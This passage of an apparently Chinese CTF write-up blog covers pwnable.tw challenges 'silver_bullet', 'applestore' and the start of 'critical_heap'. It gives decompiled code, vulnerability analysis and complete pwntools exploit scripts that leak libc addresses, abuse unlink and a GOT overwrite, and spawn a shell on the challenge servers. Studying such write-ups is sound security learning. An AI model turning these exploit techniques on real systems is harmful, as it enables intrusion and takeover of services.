class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process (&apos;./silver_bullet&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10103)</span><br><span class="line">elf = ELF(&apos;./silver_bullet&apos;)</span><br><span class="line">libc = ELF(&apos;libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def create(con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def powerup(con):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def beat():</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">pop_ebx_ret = 0x8048475</span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;zzzz&apos;</span><br><span class="line">pay += p32(elf.plt[&apos;puts&apos;]) + p32(pop_ebx_ret) + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">pay += p32(elf.symbols[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;win !!\n&apos;)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">system_addr = puts_addr - libc.symbols[&apos;puts&apos;] +  libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line"></span><br><span class="line">success(&quot;system_addr : &quot; + hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr : &quot; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;bbbb&apos;</span><br><span class="line">pay += p32(system_addr) + p32(pop_ebx_ret) + p32(binsh_addr)</span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><p><em>好难啊啊啊啊啊，心累的不行，看大佬的wp回回血</em></p><p>ps: 假如在    libc = ELF(‘./libc_32.so.6’) 时出现这种报错：ValueError: seek out of range ， 多半就是文件没下载完全。。</p><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>主要功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;=== Menu ===&quot;);</span><br><span class="line">  printf(&quot;%d: Apple Store\n&quot;, 1);</span><br><span class="line">  printf(&quot;%d: Add into your shopping cart\n&quot;, 2);</span><br><span class="line">  printf(&quot;%d: Remove from your shopping cart\n&quot;, 3);</span><br><span class="line">  printf(&quot;%d: List your shopping cart\n&quot;, 4);</span><br><span class="line">  printf(&quot;%d: Checkout\n&quot;, 5);</span><br><span class="line">  return printf(&quot;%d: Exit\n&quot;, 6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int handler()</span><br><span class="line">&#123;</span><br><span class="line">  char nptr; // [esp+16h] [ebp-22h]</span><br><span class="line">  unsigned int v2; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;&gt; &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    my_read(&amp;nptr, 0x15u);</span><br><span class="line">    switch ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        list();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        cart();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        checkout();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        puts(&quot;Thank You for Your Purchase!&quot;);</span><br><span class="line">        return __readgsdword(0x14u) ^ v2;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;It&apos;s not a choice! Idiot.&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()         //添加购物车，采用了my_read函数，但是存在问题，也就是在read时可以输入\x00在中间分隔，以便在不影响后面的基础上，覆盖后面栈上的内容。</span><br><span class="line">&#123;</span><br><span class="line">  char **v1; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v3; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Device Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  switch ( atoi(&amp;nptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    case 1:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 2:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6 Plus&quot;, (char *)299);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 3:</span><br><span class="line">      v1 = create((int)&quot;iPad Air 2&quot;, (char *)499);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 4:</span><br><span class="line">      v1 = create((int)&quot;iPad Mini 3&quot;, (char *)399);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 5:</span><br><span class="line">      v1 = create((int)&quot;iPod Touch&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">LABEL_8:</span><br><span class="line">      printf(&quot;You&apos;ve put *%s* in your shopping cart.\n&quot;, *v1);</span><br><span class="line">      puts(&quot;Brilliant! That&apos;s an amazing idea.&quot;);</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      puts(&quot;Stop doing that. Idiot!&quot;);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int cart()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v0; // eax</span><br><span class="line">  signed int v2; // [esp+18h] [ebp-30h]</span><br><span class="line">  int cost; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  _DWORD *i; // [esp+20h] [ebp-28h]</span><br><span class="line">  char buf; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v6; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  v2 = 1;</span><br><span class="line">  cost = 0;</span><br><span class="line">  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;buf, 0x15u);</span><br><span class="line">  if ( buf == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;==== Cart ====&quot;);  //遍历链表来输出cart</span><br><span class="line">    for ( i = (_DWORD *)mycart; i; i = (_DWORD *)i[2] )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      printf(&quot;%d: %s - $%d\n&quot;, v0, *i, i[1]);   // i[1] == money</span><br><span class="line">                                                </span><br><span class="line">      cost += i[1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [esp+10h] [ebp-38h]</span><br><span class="line">  _DWORD *v2; // [esp+14h] [ebp-34h]</span><br><span class="line">  int v3; // [esp+18h] [ebp-30h]</span><br><span class="line">  int FD; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  int BK; // [esp+20h] [ebp-28h]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v7; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(0x14u);</span><br><span class="line">  v1 = 1;</span><br><span class="line">  v2 = (_DWORD *)mycart;</span><br><span class="line">  printf(&quot;Item Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br><span class="line">  while ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( v1 == v3 )                  //典型的unlink</span><br><span class="line">    &#123;</span><br><span class="line">      FD = v2[2];</span><br><span class="line">      BK = v2[3];</span><br><span class="line">      if ( BK )</span><br><span class="line">        *(_DWORD *)(BK + 8) = FD;</span><br><span class="line">      if ( FD )</span><br><span class="line">        *(_DWORD *)(FD + 12) = BK;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      printf(&quot;Remove %d:%s from your shopping cart.\n&quot;, v1, *v2);</span><br><span class="line">      return __readgsdword(0x14u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 = (_DWORD *)v2[2];</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int checkout()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+10h] [ebp-28h]</span><br><span class="line">  char *v2; // [esp+18h] [ebp-20h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v4; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  if ( v1 == 7174 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;*: iPhone 8 - $1&quot;);</span><br><span class="line">    asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;);</span><br><span class="line">    v3 = 1;</span><br><span class="line">    insert((int)&amp;v2);</span><br><span class="line">    v1 = 7175;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Total: $%d\n&quot;, v1);</span><br><span class="line">  puts(&quot;Want to checkout? Maybe next time!&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>在不断的使用添加购物车的函数add后，其形成了一个链表，而在输出时是通过遍历链表来依次输出的。<br>结构str大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str[0]: cost</span><br><span class="line">str[1]: name---&gt; 实际为指针</span><br><span class="line">str[2]: FD</span><br><span class="line">str[3]: BK</span><br></pre></td></tr></table></figure><p>而我们在输入时使用的my_read函数（cart/delete函数均调用）因为可以覆盖后面的栈，所以会有希望去修改链表的节点为got表之类的。然后cart函数来泄露libc基址等等。</p><p>同时，在delete函数中使用了unlink的过程，也有利用的希望。RELRO不是full说明GOT表还是可以修改的，所以可以用unlink来修改got表.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec applestore</span><br><span class="line">[*] &apos;/root/pwnable/applestore/applestore&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>不过漏洞利用的切入点其实在后面，在checkout函数里，当购物车金额达到7174，就会赠送一个iphone8…而偏偏赠送的这个iphone8被放在了栈里面。而其实这几个函数用的都是同一栈帧（栈顶或许有差异，但是栈底是一致的），而恰好存储iphone8的位置在其他函数中可以被修改。也就是链表的结尾分配到了我们可以修改的栈上。</p><p>除此以外，需要栈地址的泄露，可以：</p><ol><li>利用前面的leak洞,从第一个chunk开始,不断leak chunk的fd,直到stack上的chunk的前一个的chunk的fd,即可得到stack</li><li>我们可以用environ变量加上libc的基址来得到栈地址。</li></ol><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./applestore&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10104)</span><br><span class="line">bin = ELF(&apos;./applestore&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def buy(idx):</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;Device Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele2(con):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def show(con):</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def checkout():</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">buy(2)</span><br><span class="line">for i in range(6):</span><br><span class="line">buy(1)</span><br><span class="line"></span><br><span class="line">checkout()</span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(bin.got[&apos;puts&apos;]) + 3*p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">libc.address = u32(sh.recv(4))-libc.symbols[&apos;puts&apos;]</span><br><span class="line">envp = libc.symbols[&apos;environ&apos;]</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">success(&apos;envp: &apos;+hex(envp))</span><br><span class="line"></span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(envp)+p32(1)+p32(0)+p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">stack_envp = u32(sh.recv(4))</span><br><span class="line">success(&apos;stack_envp: &apos;+hex(stack_envp))    //通过environ泄露栈地址</span><br><span class="line"></span><br><span class="line">//仍未理解的过程：交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system.</span><br><span class="line"></span><br><span class="line">ebp = stack_envp-0x104</span><br><span class="line">atoi_got = bin.got[&apos;atoi&apos;]</span><br><span class="line">pay = &apos;27&apos;</span><br><span class="line">pay += p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)</span><br><span class="line">dele2(pay)</span><br><span class="line"></span><br><span class="line">pay = &apos;$0\x00\x00&apos;+p32(system)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="critical-heap"><a href="#critical-heap" class="headerlink" title="critical_heap"></a>critical_heap</h1><p><em>难到仅有的wp基本上完全看不懂。。。</em></p><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>题目比较长，功能比较丰富。。</p><p>分析出来的结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">struct clock&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0xDEADBEEF;</span><br><span class="line">  char[4] year;</span><br><span class="line">  char[4] month;</span><br><span class="line">  char[4] day;</span><br><span class="line">  char[4] hour;</span><br><span class="line">  char[4] minute;</span><br><span class="line">  char[4] second;</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">struct system&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x48694869;</span><br><span class="line">  string PathOfSystem;</span><br><span class="line">  string DetailOfSystem;</span><br><span class="line">  char[4] UserOfSystem;</span><br><span class="line">  char[4] NameOfSystem;</span><br><span class="line">  char[4] rand;</span><br><span class="line"></span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line">struct normal&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x13371337;</span><br><span class="line">  char[40] content;</span><br><span class="line">  int sig;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>完全没有见过的漏洞。。。相较于文件漏洞，倒更像是函数源码漏洞与小小的文件漏洞相配合产生的大问题。。。</p><ol><li>localtime和setenv配合能将任意文件内容写到heap上.  </li><li>chunk_system的detail在offset 0x20,chunk_normal的content在offset 0x18的位置,content读取的时候没有截断,而detail是存在栈上的,因此可以leak heap. （比较容易想到的漏洞,文件漏洞）.</li><li>在normal_heap的play下,有一个printf_chk的fmt洞,配合normal_heap的play下的change content就能在栈上留下信息,然后任意地址读(因为有chk,所以应该是无法用%n来任意地址写的).</li></ol><p>第一步需要看localtime的源码：以libc2.23源码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td 